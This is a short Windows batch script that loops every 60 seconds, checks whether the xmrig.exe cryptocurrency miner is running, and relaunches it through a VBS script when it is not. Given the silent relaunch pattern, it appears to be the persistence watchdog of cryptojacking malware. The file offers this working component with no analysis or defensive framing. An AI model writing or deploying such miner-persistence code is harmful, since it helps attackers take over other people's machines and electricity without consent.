@echo off
:loop
tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I /N "xmrig.exe">NUL
if "%ERRORLEVEL%"=="1" (
    wscript.exe "run_final.vbs"
)
timeout /t 60 /nobreak >nul
goto loop